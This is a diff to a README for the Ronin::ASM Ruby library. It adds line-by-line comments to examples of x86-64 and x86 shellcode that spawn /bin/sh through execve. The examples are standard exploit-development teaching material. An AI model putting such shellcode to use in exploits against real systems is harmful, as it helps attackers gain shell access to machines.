@@ -54,16 +54,16 @@ Create x86-64 shellcode:
 
 ```ruby
 asm = Ronin::ASM.new do
-  xor rdx, rdx
-  mov rbx, 0x68732f6e69622f2f
-  shr rbx, 8
-  push rbx
-  mov rdi, rsp
-  push rdx
-  push rdi
-  mov rsi, rsp
-  mov al, 0x3b
-  syscall
+  xor rdx, rdx                # set rdx (envp) to NULL
+  mov rbx, 0x68732f6e69622f2f # set rbx to "//bin/sh"
+  shr rbx, 8                  # add a \0 byte by shifting right one byte
+  push rbx                    # push "/bin/sh\0" to the stack
+  mov rdi, rsp                # rdi (pathname) points onto the stack
+  push rdx                    # push NULL onto the stack
+  push rdi                    # push pointer to pathname
+  mov rsi, rsp                # rsi (argv) points to the stack
+  mov al, 0x3b                # Linux x86-64 syscall number for execve()
+  syscall                     # call execve(pathname,argv,envp)
 end
 
 payload = asm.assemble
@@ -74,17 +74,17 @@ Create x86 shellcode:
 
 ```ruby
 asm = Ronin::ASM.new(arch: :x86) do
-  xor   eax, eax
-  push  eax
-  push  0x68732f2f
-  push  0x6e69622f
-  mov   ebx, esp
-  push  eax
-  push  ebx
-  mov   ecx, esp
-  xor   edx, edx
-  mov   al, 0xb
-  int   0x80
+  xor   eax, eax   # set eax to zero
+  push  eax        # push a \0 byte onto the stack
+  push  0x68732f2f # push "//sh" onto the stack
+  push  0x6e69622f # push "/bin" onto the stack (note: stack grows down)
+  mov   ebx, esp   # ebx (pathname) points to the stack
+  push  eax        # push NULL onto the stack
+  push  ebx        # push pointer to pathname
+  mov   ecx, esp   # ecx (argv) points to the stack
+  xor   edx, edx   # set edx (envp) to zero
+  mov   al, 0xb    # Linux x86 syscall number for execve()
+  int   0x80       # call execve(pathname,argv,envp)
 end
 
 payload = asm.assemble
@@ -195,7 +195,7 @@ OS:
 ```ruby
 asm = Ronin::ASM.new(os: :linux) do
   # ...
-  exit_syscall(42)
+  exit_syscall(42)            # call exit(42)
 end
 ```
 
@@ -203,16 +203,16 @@ Registers can also be passed to syscall macros as arguments:
 
 ```ruby
 Ronin::ASM.new(os: :linux) do
-  xor rdx, rdx
-  mov rbx, 0x68732f6e69622f2f
-  shr rbx, 8
-  push rbx
-  mov rdi, rsp
-  push rdx
-  push rdi
-  mov rsi, rsp
+  xor rdx, rdx                # set rdx (envp) to NULL
+  mov rbx, 0x68732f6e69622f2f # set rbx to "//bin/sh"
+  shr rbx, 8                  # add a \0 byte by shifting right one byte
+  push rbx                    # push "/bin/sh\0" to the stack
+  mov rdi, rsp                # rdi (pathname) points onto the stack
+  push rdx                    # push NULL onto the stack
+  push rdi                    # push pointer to pathname
+  mov rsi, rsp                # rsi (argv) points to the stack
 
-  execve_syscall(rdi,rsi,rdx)
+  execve_syscall(rdi,rsi,rdx) # call execve(pathname,argv,envp)
 end
 ```
 
